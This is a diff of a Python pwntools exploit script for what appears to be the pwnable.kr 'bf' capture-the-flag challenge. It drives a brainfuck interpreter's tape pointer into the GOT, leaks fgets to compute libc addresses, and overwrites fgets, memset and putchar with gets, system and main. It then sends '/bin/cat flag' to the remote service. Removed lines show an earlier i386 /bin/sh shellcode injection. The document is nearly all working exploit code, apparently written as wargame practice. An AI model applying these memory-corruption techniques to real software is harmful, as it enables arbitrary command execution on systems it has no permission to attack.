@@ -1,14 +1,6 @@
 import pwn
-import code
+import sys
 
-# stack looks like:
-# [start]
-# [main]
-# [dobrainfuck]
-# Couple useful tools:
-
-read_count = 0
-write_queue = b''
 prog = b''
 
 def next(n=1):
@@ -23,61 +15,44 @@ def previous(n):
 
 def out(n):
     global prog
-    prog = prog + b'.' * n
+    prog = prog + b'.>' * n
+    previous(n)
 
-def readn(n):
-    """ Read the current byte and increment the pointer n times"""
-    global prog
-    global read_count
-    read_count = read_count + n
-    prog += b'.>' * n
 
-def write(byteValues, up=True):
-    """ Write the byte array to the current pointer, progresses poitner by len byteValues"""
+def write(n):
+    """ Write the byte array to the current pointer, automatically resets pointer"""
     global write_queue
     global prog
-    write_queue += byteValues
-    if up:
-        prog = prog + b',>' * len(byteValues)
-    else:
-        prog = prog + b',<' * len(byteValues)
+    prog = prog + b',>' * n
+    previous(n)
 
-# Payload construction
-#write(b'/bin/sh')
-# prog = previous(prog, 7)
-# prog = readn(prog, 7) # This is returning /bin/sh like we expect
 
-# get shellcode
-shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())
+bf = pwn.ELF('bf')
+bf_libc = pwn.ELF('bf_libc.so')
+#bf_libc = pwn.ELF('/usr/lib32/libc.so.6')
 
-# write shellcode to begining of tape @0x0804a0a0 (going up) 
-tape = 0x0804a0a0
-write(shellcode)
-previous(len(shellcode))
+# Move to the lowest are
+start = bf.symbols['tape']
+gfgets = bf.symbols['got.fgets']
+gmemset = bf.symbols['got.memset']
+gputchar = bf.symbols['got.putchar']
 
-# progress down to putchar @0x0804a030
-putchar = 0x0804a030
-previous(tape - putchar)
-# overwrite with pointer to shellcode on tape
-write(pwn.p32(tape, endian='little'), up=False) # Write the address backwards =)
+# Progress to fgets in GOT
+previous(start - gfgets)
+out(4) # Leak current fgets for the math that will follow...
+write(4) # Overwrite fgets -> gets
+
+# progress to memset
+next(gmemset - gfgets)
+write(4) # Overwrite memset -> system
+
+# Progress to putchar, replace with main/_start
+next(gputchar - gmemset)
+write(4) # Overwrite putchar -> main
+
 # Trigger putchar() with '.'
 out(1)
 
-# Diagnostics
-print("Program size: {} bytes".format(len(prog)))
-print("Program:\n{}".format(prog))
-
-# use the local copy to see if we can debug or something.
-p = pwn.process('./bf')
-p.recvline()
-p.recvline()
-p.sendline(str(prog))
-p.send(write_queue)
-
-# Recover results
-results = p.recvall()
-code.interact(local=locals())
-exit()
 # Connect...
 host = 'pwnable.kr'
 port = 9001
@@ -86,9 +61,32 @@ conn.recvline()
 conn.recvline()
 
 # Send the program
-conn.sendline(str(prog))
+conn.sendline(prog)
+
+# Read real fgets location
+received = conn.recvn(4)
+leak = int.from_bytes(received, "little")
+offset_to_system = bf_libc.symbols['fgets'] - bf_libc.symbols['system']
+offset_to_gets = bf_libc.symbols['fgets'] - bf_libc.symbols['gets']
+write_queue = pwn.p32(leak - offset_to_system)
+write_queue += pwn.p32(leak - offset_to_gets)
+write_queue += pwn.p32(bf.symbols['main'])
+write_queue += b'/bin/cat flag\n'
+
 conn.send(write_queue)
+
+# Ignore instructions
+conn.recvline()
+conn.recvline()
 
 # Recover results
 results = conn.recvall()
-code.interact(local=locals())
+print(b'-'*20 + b' Flag ' + b'-'*20)
+print(results)
+print(b'-'*20 + b' Flag ' + b'-'*20)
+
+print("fgets address leaked: {}".format(hex(leak)))
+print("Program size: {} bytes".format(len(prog)))
+print("Program:\n{}".format(prog))
+print("Write queue:")
+print(write_queue)
